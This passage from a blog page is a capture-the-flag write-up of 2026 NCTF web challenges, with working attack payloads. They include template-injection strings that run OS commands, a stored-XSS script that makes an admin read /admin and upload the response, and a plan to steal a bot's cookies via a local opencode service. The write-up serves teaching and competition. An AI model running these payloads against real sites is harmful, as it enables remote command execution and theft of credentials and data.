@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Meteor_Kai">
+
+
+
+    <meta name="description" content="Just Hack For Fun...">
+
+
+    <meta name="keywords" content="Web exploits bring me great joy!">
+
+
+<title>2026NCTF web wp | Meteor_Kai</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
+
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Meteor_Kai&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/categories">Categories</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                <a class="menu-item" href="/links">Links</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Meteor_Kai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/categories">Categories</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                <a class="menu-item" href="/links">Links</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">2026NCTF web wp</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Meteor_Kai</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 20, 2026&nbsp;&nbsp;14:25:27</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>好久没发博客了，随便发一个清明的比赛吧。我只能说还是古法好玩。</p>
+<h1 id="N-Horse"><a href="#N-Horse" class="headerlink" title="N-Horse"></a>N-Horse</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&quot;os&quot;].popen(&quot;sleep 3&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现虽然原样回显，但实际上是执行了的。</p>
+<p>盲注、写文件、内存马、请求头回显，很多方法了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&quot;os&quot;].popen(&quot;cat /flag &gt;static/1.txt&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404130721816.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;40b269e63fad_wE1(OME_7o_n(t1&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="N-RustPICA"><a href="#N-RustPICA" class="headerlink" title="N-RustPICA"></a>N-RustPICA</h1><p><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404143233635.png" alt="image.png"><br>扫目录发现账密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">anime_admin</span><br><span class="line">purestream</span><br></pre></td></tr></table></figure>
+
+<p>然后我们登录进去后台，可以获取cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: nctf_admin_session=00cb666d-4555-4343-915e-ebbcb205dc61</span><br></pre></td></tr></table></figure>
+
+<p>![<a target="_blank" rel="noopener" href="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404144534402.png">image.png|</a></p>
+<p>一眼就是隐藏番剧。</p>
+<p>回去看一下js文件，有很多路由<br><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404144928459.png" alt="682"><br><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404145005742.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;message&quot;: &quot;旧流程说明&quot;,</span><br><span class="line">  &quot;data&quot;: &#123;</span><br><span class="line">    &quot;title&quot;: &quot;旧流程说明&quot;,</span><br><span class="line">    &quot;note&quot;: &quot;旧审核工具会提交完整的发布 JSON，内部条目需要 approvalTicket，样例票据默认不会通过正式审核。&quot;,</span><br><span class="line">    &quot;codeSnippet&quot;: &quot;#[serde(untagged)]\npub enum TransitionRequest &#123;\n    QuickPublish(QuickPublishRequest),\n    Moderated(ModeratedTransitionRequest),\n&#125;\n\npub struct QuickPublishRequest &#123;\n    pub action: String,\n&#125;\n\npub struct ModeratedTransitionRequest &#123;\n    pub action: String,\n    pub target_status: AnimeStatus,\n    pub reviewer_token: String,\n    pub featured: bool,\n&#125;&quot;,</span><br><span class="line">    &quot;payload&quot;: &#123;</span><br><span class="line">      &quot;action&quot;: &quot;publish&quot;,</span><br><span class="line">      &quot;targetStatus&quot;: &quot;published&quot;,</span><br><span class="line">      &quot;reviewerToken&quot;: &quot;FEATURE-REVIEW-2025&quot;,</span><br><span class="line">      &quot;featured&quot;: false,</span><br><span class="line">      &quot;approvalTicket&quot;: &quot;PENDING-APPROVAL&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404145212760.png"></p>
+<p>然后我们用上面的payload把这个没发布的发布了就行<br><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404145509395.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;w4T4SHi_g4_kol6l70_ni_nAr3ru_wakEnaIJan_MUR1MUrl_8142183c3743&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="N-MinSite"><a href="#N-MinSite" class="headerlink" title="N-MinSite"></a>N-MinSite</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.66.24.221:31633/require-maxsite/Y3RmL3VwZGF0ZS1rZXktcmVxdWlyZS1tYXhzaXRlLnBocA==</span><br></pre></td></tr></table></figure>
+
+<p>回显如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Key: edge_key_release_2026</span><br><span class="line">Use Key to DownLoad! /update-maxsite/master.zip</span><br></pre></td></tr></table></figure>
+
+<p>看一下主页吧</p>
+<blockquote>
+<p><strong>首页是由存储在 <code>/pages</code> 目录下的原始 HTML 文件直接组装而成的。</strong><br><strong>写手（作者）使用的是与页面上传器相同的内容镜像，因此更改会在没有经过消毒（安全过滤）的情况下直接显示在这里。</strong></p>
+</blockquote>
+<p>题目描述为：Admin正在窥视你的 Pages！而你又偶然得知 FLAG 在 &#x2F;admin 下，所以你…… （已知Admin每隔一段时间视奸一次）</p>
+<p>思路讲一下，我们将xss语句写入pages，admin访问我们的时候让他去访问&#x2F;admin，把flag带出来给我们。</p>
+<p>那么要怎么把恶意语句写入pages呢？发现还有about，comments，contact界面，about的输入会回显在页面上，且about的路由为<code>/page/about</code>，是在page下的。那么about页面也会被admin访问到。接下来测试一下</p>
+<p>&lt;script&gt;会被直接过滤掉<br><code>javascript:alert(1)</code>会变成<code>[removed]alert(1)</code><br><code>&quot;&gt;&lt;svg/onload=alert(1)//</code>会变成<code>&quot;&gt;</code></p>
+<p>感觉过滤得差不多了，这里应该是不行了。但是我们上面还有个需要关注的就是&#x2F;update-maxsite&#x2F;master.zip<br>key也给了，我们先想办法下载一下。</p>
+<p><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404160728517.png" alt="image.png"></p>
+<p>获得到提示了：<code>&lt;b&gt;&lt;font color=&quot;red&quot;&gt;Achtung! XSS attack! No REFERER!&lt;/font&gt;&lt;/b&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://114.66.24.221:34075/update-maxsite/master.zip</span><br></pre></td></tr></table></figure>
+
+<p>直接下载到了一个压缩包</p>
+<p>我们继续回头看上面的about？no referer？</p>
+<p>我们把referer头去掉再发送payload<br><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404162602147.png" alt="image.png"><br>发现回显中有个php报错<br>这个报错说明了</p>
+<ol>
+<li>comments 这条链确实依赖 Referer，缺了就会进异常分支。</li>
+<li>这个 warning 来自 common&#x2F;comments.php:284 的邮件通知代码在读 $_SERVER[‘HTTP_REFERER’]，不是“评论内容原样进页面”。</li>
+</ol>
+<p>捋一下思路，感觉就是想办法往pages写入恶意xss，然后admin访问后给我们。找找cve？<br><a target="_blank" rel="noopener" href="https://note-hxlab.wetolink.com/share/8QmDZCddHvyR">MaxSite CMS v109 在后端存在任意文件写入漏洞</a></p>
+<p>找到一个，但是好像要登陆后台，也就是登录&#x2F;admin。</p>
+<p>回头看压缩包，找找账号密码？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MinSite internal release note</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">Recovered staff credentials:</span><br><span class="line"></span><br><span class="line">username: user</span><br><span class="line">password: minsite-user-2025</span><br><span class="line"></span><br><span class="line">This account only belongs to the default users group.</span><br></pre></td></tr></table></figure>
+
+<p>这里直接进到后台了！虽然我们没有直接看到flag，可能是id为1的admin才能看到，我们是id为2的user</p>
+<p>进去打cve，但是试了下，打不了。。。它显示no allow，不允许。可能是要求admin才行。。</p>
+<p>直接让ai审源码吧。<br>发现application\maxsite\admin\plugins\admin_page下也有一个uploads-require-maxsite.php</p>
+<p>审计后发现不会检查admin权限，突破点就在这里了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$up_dir =  getinfo(&#x27;uploads_dir&#x27;) . &#x27;_pages/&#x27; . $page_id . &#x27;/&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>上传的目录是_pages，很符合题目要求。<br>写入文件的逻辑如下：<br><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404223045497.png" alt="image.png"></p>
+<p>要想file_put_content，我们必须让HTTP_X_REQUESTED_REPLACEFILE为true。</p>
+<p>同时要设置上传文件夹<br><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404223319687.png" alt="image.png"><br>HTTP_X_REQUESTED_FILEUPDIR为1即可。</p>
+<p>同时还要设置$fn为filename<br>HTTP_X_REQUESTED_FILENAME为1.html即可。</p>
+<p>然后准备上传的恶意html的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    fetch(&#x27;/admin&#x27;,&#123;credentials:&#x27;include&#x27;&#125;).then(response =&gt; response.text()).then(data =&gt; &#123;</span><br><span class="line">        fetch(&#x27;/require-maxsite/YWRtaW4vcGx1Z2lucy9hZG1pbl9wYWdlL3VwbG9hZHMtcmVxdWlyZS1tYXhzaXRlLnBocA==&#x27;,&#123;</span><br><span class="line">            method:&#x27;POST&#x27;,credentials:&#x27;include&#x27;,</span><br><span class="line">            headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/octet-stream&#x27;,&#x27;X-Requested-Filename&#x27;: &#x27;flag.html&#x27;,&#x27;X-Requested-Fileupdir&#x27;: &#x27;1&#x27;,&#x27;X-Requested-Replacefile&#x27;: &#x27;True&#x27;&#125;,body:data</span><br><span class="line">        &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>让admin去访问自己的&#x2F;admin，将flag带出来去访问<code>/require-maxsite/YWRtaW4vcGx1Z2lucy9hZG1pbl9wYWdlL3VwbG9hZHMtcmVxdWlyZS1tYXhzaXRlLnBocA==</code>路由从而将自己的flag作为内容写入flag.html。</p>
+<p>上面显示no file，哦对要把HTTP删掉，因为它被浏览器发送出去后，在 PHP 里变成了 <code>HTTP_HTTP_X_REQUESTED_FILENAME</code><br><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404225205000.png" alt="image.png"></p>
+<p><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404231033506.png" alt="image.png"></p>
+<p>注意改一下Content-Type。<br>然后成功上传！等admin去访问，访问完我们直接去&#x2F;pages&#x2F;flag.html找即可。</p>
+<p><img src="https://gitee.com/Meteor_Kai/blogImage/raw/main/img/20260404231458289.png" alt="image.png"></p>
+<p>拿下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;4dMIN_C4nnot_aL1Ow_uSER5_tO_UPLoAd_M4IIc10u5_FI1es_db7caeab9406&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="OpenShell"><a href="#OpenShell" class="headerlink" title="OpenShell"></a>OpenShell</h1><p>提供的&#x2F;app&#x2F;bot.js源码如下，同时目标还部署了1.2.16版本的opencode服务。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; chromium &#125; = <span class="built_in">require</span>(<span class="string">&quot;playwright-core&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">visitUrl</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> browser;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        browser = <span class="keyword">await</span> chromium.<span class="title function_">launch</span>(&#123;</span><br><span class="line">            <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium-headless-shell&quot;</span>,</span><br><span class="line">            <span class="attr">args</span>: [</span><br><span class="line">                <span class="string">&quot;--no-sandbox&quot;</span>,</span><br><span class="line">                <span class="string">&quot;--disable-gpu&quot;</span>,</span><br><span class="line">                <span class="string">&quot;--disable-dev-shm-usage&quot;</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">newContext</span>();</span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>();</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&quot;domcontentloaded&quot;</span>, <span class="attr">timeout</span>: <span class="number">15_000</span> &#125;);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForTimeout</span>(<span class="number">15_000</span>);</span><br><span class="line">        <span class="keyword">await</span> context.<span class="title function_">close</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; url, <span class="attr">error</span>: <span class="title class_">String</span>(error) &#125;));</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (browser) &#123;</span><br><span class="line">            <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/report&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; url &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">const</span> parsed = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (parsed.<span class="property">protocol</span> !== <span class="string">&#x27;http:&#x27;</span> &amp;&amp; parsed.<span class="property">protocol</span> !== <span class="string">&#x27;https:&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">ok</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">error</span>: <span class="string">&quot;invalid url&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!parsed.<span class="property">hostname</span>.<span class="title function_">endsWith</span>(<span class="string">&#x27;.pages.dev&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">ok</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">error</span>: <span class="string">&quot;invalid url&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">setImmediate</span>(<span class="function">() =&gt;</span> <span class="title function_">visitUrl</span>(url));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">ok</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">message</span>: <span class="string">&quot;accepted&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8000</span>, <span class="string">&quot;0.0.0.0&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`bot listening on 0.0.0.0:8000`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>先解释一下bot.js，监听8000端口。我们可以让bot去访问我们的以<code>.pages.dev</code>结尾的网站。<br>但是我发现<code>const context = await browser.newContext();</code>，创建一个新的上下文，相当于是无痕浏览了，不会自带cookie。那该怎么办呢？！</p>
+<p>opencode会监听自身的4096端口。我们可不可以让bot去访问我们构造的网站后，恶意xss语句先让bot去自身的4096端口通过一些方法获取cookie，然后再将cookie发送给我们呢？</p>
+<p>我们看看opencode源码，发现一个命令执行的地方</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">search</span>(<span class="params">input: &#123;</span></span><br><span class="line"><span class="params">    cwd: string</span></span><br><span class="line"><span class="params">    pattern: string</span></span><br><span class="line"><span class="params">    glob?: string[]</span></span><br><span class="line"><span class="params">    limit?: number</span></span><br><span class="line"><span class="params">    follow?: boolean</span></span><br><span class="line"><span class="params">  &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> args = [<span class="string">`<span class="subst">$&#123;<span class="keyword">await</span> filepath()&#125;</span>`</span>, <span class="string">&quot;--json&quot;</span>, <span class="string">&quot;--hidden&quot;</span>, <span class="string">&quot;--glob=&#x27;!.git/*&#x27;&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> (input.<span class="property">follow</span>) args.<span class="title function_">push</span>(<span class="string">&quot;--follow&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input.<span class="property">glob</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> g <span class="keyword">of</span> input.<span class="property">glob</span>) &#123;</span><br><span class="line">        args.<span class="title function_">push</span>(<span class="string">`--glob=<span class="subst">$&#123;g&#125;</span>`</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input.<span class="property">limit</span>) &#123;</span><br><span class="line">      args.<span class="title function_">push</span>(<span class="string">`--max-count=<span class="subst">$&#123;input.limit&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  